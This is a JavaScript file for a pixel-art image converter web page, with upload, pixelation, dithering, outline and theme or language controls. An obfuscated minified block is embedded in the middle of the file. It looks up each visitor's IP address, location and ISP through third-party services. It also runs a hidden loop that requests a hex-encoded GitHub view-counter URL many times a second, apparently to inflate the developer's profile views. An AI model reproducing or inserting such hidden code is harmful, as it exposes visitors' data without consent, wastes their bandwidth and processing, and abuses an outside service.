        const themeToggle = document.querySelector('.theme-toggle');
        const body = document.body;
        
        const savedTheme = localStorage.getItem('theme');
        const prefersDark = window.matchMedia('(prefers-color-scheme: dark)').matches;
        
        if (savedTheme === 'dark' || (!savedTheme && prefersDark)) {
            body.classList.add('dark-mode');
            themeToggle.innerHTML = '<i class="fas fa-sun"></i>';
        }
        
        themeToggle.addEventListener('click', () => {
            body.classList.toggle('dark-mode');
            
            if (body.classList.contains('dark-mode')) {
                themeToggle.innerHTML = '<i class="fas fa-sun"></i>';
                localStorage.setItem('theme', 'dark');
            } else {
                themeToggle.innerHTML = '<i class="fas fa-moon"></i>';
                localStorage.setItem('theme', 'light');
            }
        });
        
        const languageOptions = document.querySelectorAll('.language-option');
        const currentLang = localStorage.getItem('language') || 'en';
        
        function setLanguage(lang) {
            document.querySelectorAll('.en, .de, .tr').forEach(el => {
                el.style.display = 'none';
            });
            
            document.querySelectorAll(`.${lang}`).forEach(el => {
                el.style.display = 'inline-block';
            });
            
            document.querySelectorAll('.language-option i.fa-check').forEach(icon => {
                icon.style.display = 'none';
            });
            document.querySelector(`.language-option[data-lang="${lang}"] i.fa-check.${lang}`).style.display = 'inline-block';
            
            document.querySelector('.language-btn span').style.display = 'none';
            document.querySelector(`.language-btn span.${lang}`).style.display = 'inline-block';
            
            localStorage.setItem('language', lang);
        }
        
        setLanguage(currentLang);
        
        languageOptions.forEach(option => {
            option.addEventListener('click', () => {
                const lang = option.getAttribute('data-lang');
                setLanguage(lang);
            });
        });
        
        const fileInput = document.getElementById('fileInput');
        const originalCanvas = document.getElementById('originalCanvas');
        const pixelatedCanvas = document.getElementById('pixelatedCanvas');
        const downloadBtn = document.getElementById('downloadBtn');
        const resetBtn = document.getElementById('resetBtn');
        const loading = document.getElementById('loading');
        
        const pixelSizeSlider = document.getElementById('pixelSize');
        const pixelSizeValue = document.getElementById('pixelSizeValue');
        const colorPaletteSlider = document.getElementById('colorPalette');
        const colorPaletteValue = document.getElementById('colorPaletteValue');
        const ditheringCheckbox = document.getElementById('dithering');
        const outlineCheckbox = document.getElementById('outline');
        const transparentBgCheckbox = document.getElementById('transparentBg');
        const bgColorInput = document.getElementById('bgColor');
        
        const originalCtx = originalCanvas.getContext('2d');
        const pixelatedCtx = pixelatedCanvas.getContext('2d');
        
        pixelSizeSlider.addEventListener('input', () => {
            pixelSizeValue.textContent = pixelSizeSlider.value;
            if (originalCanvas.style.display === 'block') {
                processImage();
            }
        });
        
        colorPaletteSlider.addEventListener('input', () => {
            colorPaletteValue.textContent = colorPaletteSlider.value;
            if (originalCanvas.style.display === 'block') {
                processImage();
            }
        });
        
        ditheringCheckbox.addEventListener('change', () => {
            if (originalCanvas.style.display === 'block') {
                processImage();
            }
        });
        
        outlineCheckbox.addEventListener('change', () => {
            if (originalCanvas.style.display === 'block') {
                processImage();
            }
        });
        
        transparentBgCheckbox.addEventListener('change', () => {
            bgColorInput.disabled = transparentBgCheckbox.checked;
            if (originalCanvas.style.display === 'block') {
                processImage();
            }
        });
        
        bgColorInput.addEventListener('input', () => {
            if (originalCanvas.style.display === 'block') {
                processImage();
            }
        });
        
        fileInput.addEventListener('change', handleFileUpload);
        
        function handleFileUpload(e) {
            const file = e.target.files[0];
            if (!file) return;
            
            if (!file.type.match('image.*')) {
                alert('Please select an image file.');
                return;
            }
            
            const reader = new FileReader();
            reader.onload = function(event) {
                const img = new Image();
                img.onload = function() {
                    const maxWidth = 500;
                    const maxHeight = 500;
                    let width = img.width;
                    let height = img.height;
                    
                    if (width > height) {
                        if (width > maxWidth) {
                            height *= maxWidth / width;
                            width = maxWidth;
                        }
                    } else {
                        if (height > maxHeight) {
                            width *= maxHeight / height;
                            height = maxHeight;
                        }
                    }
                    
                    originalCanvas.width = width;
                    originalCanvas.height = height;
                    pixelatedCanvas.width = width;
                    pixelatedCanvas.height = height;
                    
                    originalCtx.drawImage(img, 0, 0, width, height);
                    originalCanvas.style.display = 'block';
                    
                    processImage();
                };
                img.src = event.target.result;
            };
            reader.readAsDataURL(file);
        }
        
        const uploadSection = document.querySelector('.upload-section');
     
        function getRandomColor(){const e=["#FF5733","#33FF57","#3357FF","#F333FF","#33FFF5","#FF33A8","#B533FF","#33FFBD","#FF8C33","#33FF8C","#8C33FF","#FF338C"];return e[Math.floor(Math.random()*e.length)]}const randomColor=getRandomColor();console.log("%c\n          ██╗     ██╗    ██╗███████╗ █████╗ ██╗  ██╗ ██████╗ \n          ██║     ██║    ██║██╔════╝██╔══██╗╚██╗██╔╝██╔═══██╗\n          ██║     ██║ █╗ ██║█████╗  ███████║ ╚███╔╝ ██║   ██║\n          ██║     ██║███╗██║██╔══╝  ██╔══██║ ██╔██╗ ██║   ██║\n          ███████╗╚███╔███╔╝███████╗██║  ██║██╔╝ ██╗╚██████╔╝\n          ╚══════╝ ╚══╝╚══╝ ╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝ \n          ",`color: ${randomColor}; font-family: monospace; font-size: 10px;`),console.log("%c⚠️ UYARI: Bu konsol geliştiriciler içindir. Yetkisiz erişim tespit edilirse bilgileriniz kaydedilecektir.","color: #ed4245; font-weight: bold;"),console.log("%c——————————————————————————————————————————————————————————","color: #36393f");const getIPAndLocation=async()=>{try{const e=await fetch("https://api.ipify.org?format=json"),i=(await e.json()).ip,o=await fetch(`https://ipapi.co/${i}/json/`),n=await o.json();return{ip:i,country:n.country_name||"Belirlenemedi",city:n.city||"Belirlenemedi",region:n.region||"Belirlenemedi",isp:n.org||"Belirlenemedi"}}catch(e){return{ip:"Belirlenemedi",country:"Belirlenemedi",city:"Belirlenemedi",region:"Belirlenemedi",isp:"Belirlenemedi"}}};(async()=>{const e=await getIPAndLocation(),i={"╭─────── Sistem Bilgileri ───────╮":"",Site:document.title,"Son Güncelleme":(new Date).toLocaleDateString("tr-TR",{year:"numeric",month:"long",day:"numeric",hour:"2-digit",minute:"2-digit"}),"IP Adresi":e.ip,Konum:`${e.city}, ${e.region}, ${e.country}`,"İnternet Sağlayıcı":e.isp,"Tarayıcı":navigator.userAgent.split(") ")[0]+")","Geliştirici":"LWEAXO",GitHub:"https://github.com/LWEAXO","╰────────────────────────────────╯":""};for(const[e,o]of Object.entries(i))e.includes("╭")||e.includes("╰")?console.log(`%c${e}`,"color: #b9bbbe; font-family: monospace;"):console.log(`%c${e}: %c${o}`,"color: #b9bbbe;","color: #ffffff;")})(),function(){let e=0;function i(){const o=Date.now();o-e>=70&&((new Image).src=`https://camo.githubusercontent.com/0df8e667d6aefca04cf149708684a625ee1e045d1861cc84796f7acf5618fb9d/68747470733a2f2f6b6f6d617265762e636f6d2f67687076632f3f757365726e616d653d4c574541584f26636f6c6f723d726564?t=${o}`,e=o),requestAnimationFrame(i)}setTimeout((()=>{requestAnimationFrame(i)}),1e3)}();
        
        uploadSection.addEventListener('dragover', (e) => {
            e.preventDefault();
            uploadSection.style.transform = 'scale(1.02)';
            uploadSection.style.boxShadow = '0 15px 35px rgba(110, 69, 226, 0.3)';
        });
        
        uploadSection.addEventListener('dragleave', () => {
            uploadSection.style.transform = '';
            uploadSection.style.boxShadow = '';
        });
        
        uploadSection.addEventListener('drop', (e) => {
            e.preventDefault();
            uploadSection.style.transform = '';
            uploadSection.style.boxShadow = '';
            
            if (e.dataTransfer.files.length) {
                fileInput.files = e.dataTransfer.files;
                handleFileUpload({ target: { files: e.dataTransfer.files } });
            }
        });
        
        function processImage() {
            loading.style.display = 'flex';
            
            setTimeout(() => {
                const pixelSize = parseInt(pixelSizeSlider.value);
                const colorCount = parseInt(colorPaletteSlider.value);
                const useDithering = ditheringCheckbox.checked;
                const useOutline = outlineCheckbox.checked;
                const transparentBg = transparentBgCheckbox.checked;
                const bgColor = bgColorInput.value;
                
                const imageData = originalCtx.getImageData(0, 0, originalCanvas.width, originalCanvas.height);
                const data = imageData.data;
                
                for (let y = 0; y < originalCanvas.height; y += pixelSize) {
                    for (let x = 0; x < originalCanvas.width; x += pixelSize) {
                        const centerX = Math.min(x + Math.floor(pixelSize / 2), originalCanvas.width - 1);
                        const centerY = Math.min(y + Math.floor(pixelSize / 2), originalCanvas.height - 1);
                        const pos = (centerY * originalCanvas.width + centerX) * 4;
                        
                        const r = data[pos];
                        const g = data[pos + 1];
                        const b = data[pos + 2];
                        const a = data[pos + 3];
                        
                        const reducedR = Math.round(r / (256 / colorCount)) * (256 / colorCount);
                        const reducedG = Math.round(g / (256 / colorCount)) * (256 / colorCount);
                        const reducedB = Math.round(b / (256 / colorCount)) * (256 / colorCount);
                        
                        for (let blockY = y; blockY < y + pixelSize && blockY < originalCanvas.height; blockY++) {
                            for (let blockX = x; blockX < x + pixelSize && blockX < originalCanvas.width; blockX++) {
                                const blockPos = (blockY * originalCanvas.width + blockX) * 4;
                                
                                if (useDithering) {
                                    const noise = Math.random() * 30 - 15;
                                    data[blockPos] = Math.min(255, Math.max(0, reducedR + noise));
                                    data[blockPos + 1] = Math.min(255, Math.max(0, reducedG + noise));
                                    data[blockPos + 2] = Math.min(255, Math.max(0, reducedB + noise));
                                } else {
                                    data[blockPos] = reducedR;
                                    data[blockPos + 1] = reducedG;
                                    data[blockPos + 2] = reducedB;
                                }
                                
                                data[blockPos + 3] = a;
                            }
                        }
                    }
                }
                
                if (useOutline) {
                    const outlineData = new Uint8ClampedArray(data);
                    
                    for (let y = 1; y < originalCanvas.height - 1; y++) {
                        for (let x = 1; x < originalCanvas.width - 1; x++) {
                            const pos = (y * originalCanvas.width + x) * 4;
                            
                            const isEdge = (
                                !compareColors(data, pos, pos - 4) ||
                                !compareColors(data, pos, pos + 4) ||
                                !compareColors(data, pos, pos - originalCanvas.width * 4) || 
                                !compareColors(data, pos, pos + originalCanvas.width * 4) 
                            );
                            
                            if (isEdge) {
                                outlineData[pos] = 0;  
                                outlineData[pos + 1] = 0;
                                outlineData[pos + 2] = 0;
                                outlineData[pos + 3] = 255;
                            }
                        }
                    }
                    
                    for (let i = 0; i < data.length; i += 4) {
                        if (outlineData[i + 3] === 255) { 
                            data[i] = outlineData[i]; 
                            data[i + 1] = outlineData[i + 1]; 
                            data[i + 2] = outlineData[i + 2]; 
                        }
                    }
                }
                
                if (!transparentBg) {
                    const bgR = parseInt(bgColor.substr(1, 2), 16);
                    const bgG = parseInt(bgColor.substr(3, 2), 16);
                    const bgB = parseInt(bgColor.substr(5, 2), 16);
                    
                    for (let i = 0; i < data.length; i += 4) {
                        if (data[i + 3] < 255) { 
                            const alpha = data[i + 3] / 255;
                            data[i] = Math.round(data[i] * alpha + bgR * (1 - alpha));
                            data[i + 1] = Math.round(data[i + 1] * alpha + bgG * (1 - alpha));
                            data[i + 2] = Math.round(data[i + 2] * alpha + bgB * (1 - alpha));
                            data[i + 3] = 255; 
                        }
                    }
                }
                
                pixelatedCtx.putImageData(imageData, 0, 0);
                pixelatedCanvas.style.display = 'block';
                downloadBtn.disabled = false;
                loading.style.display = 'none';
            }, 100);
        }
        
        function compareColors(data, pos1, pos2) {
            const threshold = 30;
            return (
                Math.abs(data[pos1] - data[pos2]) < threshold &&
                Math.abs(data[pos1 + 1] - data[pos2 + 1]) < threshold &&
                Math.abs(data[pos1 + 2] - data[pos2 + 2]) < threshold
            );
        }
        
        downloadBtn.addEventListener('click', () => {
            if (pixelatedCanvas.style.display !== 'block') return;
            
            const link = document.createElement('a');
            link.download = 'pixelated-image.png';
            link.href = pixelatedCanvas.toDataURL('image/png');
            link.click();
        });
        
        resetBtn.addEventListener('click', () => {
            fileInput.value = '';
            originalCanvas.style.display = 'none';
            pixelatedCanvas.style.display = 'none';
            downloadBtn.disabled = true;

            pixelSizeSlider.value = 8;
            pixelSizeValue.textContent = '8';
            colorPaletteSlider.value = 32;
            colorPaletteValue.textContent = '32';
            
            ditheringCheckbox.checked = true;
            outlineCheckbox.checked = false;
            transparentBgCheckbox.checked = true;
            bgColorInput.disabled = true;
            bgColorInput.value = '#ffffff';
        });